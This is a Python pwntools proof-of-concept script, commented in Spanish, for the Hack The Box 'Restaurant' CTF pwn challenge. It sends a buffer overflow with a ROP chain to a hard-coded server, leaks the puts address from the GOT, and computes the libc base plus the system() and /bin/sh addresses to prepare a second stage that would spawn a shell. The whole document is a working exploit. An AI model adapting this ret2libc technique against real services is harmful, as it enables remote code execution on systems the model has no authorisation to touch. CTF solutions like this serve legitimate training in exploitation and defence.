#!/usr/bin/env python3
"""
Proof of Concept - Leak de Libc
Restaurant CTF - Hack The Box

Este script demuestra el leak de direcciones de libc
mediante buffer overflow y ROP chain.
"""

from pwn import *

# Configuración
context.arch = 'amd64'
context.log_level = 'info'

# Direcciones del binario (No PIE)
BINARY_BASE = 0x400000
POP_RDI_RET = 0x4010a3
PUTS_PLT = 0x400650
PUTS_GOT = 0x601fa8
MAIN_ADDR = 0x400f68

# Offsets en libc 2.27
LIBC_PUTS_OFFSET = 0x080aa0
LIBC_SYSTEM_OFFSET = 0x04f550
LIBC_BINSH_OFFSET = 0x1b3e1a

def exploit(host, port):
    """
    Ejecuta el exploit de leak de libc
    
    Args:
        host: IP del servidor
        port: Puerto del servidor
    
    Returns:
        tuple: (leaked_puts, libc_base) o (None, None) si falla
    """
    
    print(f"[*] Conectando a {host}:{port}...")
    p = remote(host, port)
    
    try:
        # Recibir banner
        p.recvuntil(b'>')
        
        # Seleccionar opción 1 (Fill my dish)
        p.sendline(b'1')
        p.recvuntil(b'>')
        
        # Construir payload de leak
        offset = 40  # 32 bytes buffer + 8 bytes saved rbp
        
        payload = b'A' * offset
        payload += p64(POP_RDI_RET)    # pop rdi; ret
        payload += p64(PUTS_GOT)       # arg: dirección de puts en GOT
        payload += p64(PUTS_PLT)       # llamar a puts para imprimir
        payload += p64(MAIN_ADDR)      # volver a main
        
        print(f"[*] Enviando payload de {len(payload)} bytes...")
        p.sendline(payload)
        
        # Recibir respuesta hasta volver a main
        data = p.recvuntil(b'What would you like?', timeout=5)
        
        # Buscar el leak en los datos recibidos
        lines = data.split(b'\n')
        leaked_puts = None
        
        for line in lines:
            # Buscar direcciones que parezcan válidas de libc
            for i in range(len(line) - 5):
                chunk = line[i:i+6]
                addr = u64(chunk.ljust(8, b'\x00'))
                
                # Verificar si es una dirección válida de libc (0x7fXXXXXXXXXX)
                if 0x7f0000000000 < addr < 0x800000000000:
                    leaked_puts = addr
                    break
            
            if leaked_puts:
                break
        
        if leaked_puts:
            # Calcular base de libc
            libc_base = leaked_puts - LIBC_PUTS_OFFSET
            
            print(f"\n[+] ═══════════════════════════════════════")
            print(f"[+] LEAK EXITOSO")
            print(f"[+] ═══════════════════════════════════════")
            print(f"[+] Dirección de puts:  0x{leaked_puts:012x}")
            print(f"[+] Base de libc:       0x{libc_base:012x}")
            print(f"[+] ═══════════════════════════════════════")
            
            # Calcular direcciones útiles
            system_addr = libc_base + LIBC_SYSTEM_OFFSET
            binsh_addr = libc_base + LIBC_BINSH_OFFSET
            
            print(f"[+] Direcciones calculadas:")
            print(f"[+]   system():         0x{system_addr:012x}")
            print(f"[+]   /bin/sh:          0x{binsh_addr:012x}")
            print(f"[+] ═══════════════════════════════════════\n")
            
            p.close()
            return leaked_puts, libc_base
        else:
            print("[-] No se pudo extraer el leak")
            p.close()
            return None, None
            
    except Exception as e:
        print(f"[-] Error durante el exploit: {e}")
        p.close()
        return None, None

if __name__ == "__main__":
    # Target
    HOST = "94.237.48.12"
    PORT = 40939
    
    print("╔══════════════════════════════════════════════════════╗")
    print("║  Restaurant CTF - Proof of Concept (Leak de Libc)  ║")
    print("║  Hack The Box - Easy Pwn Challenge                   ║")
    print("╚══════════════════════════════════════════════════════╝")
    print()
    
    # Ejecutar exploit
    leaked, base = exploit(HOST, PORT)
    
    if leaked and base:
        print("[✓] Leak completado exitosamente")
        print("[!] El servidor ha vuelto a main")
        print("[!] Listo para segunda etapa de explotación")
    else:
        print("[✗] Leak fallido")
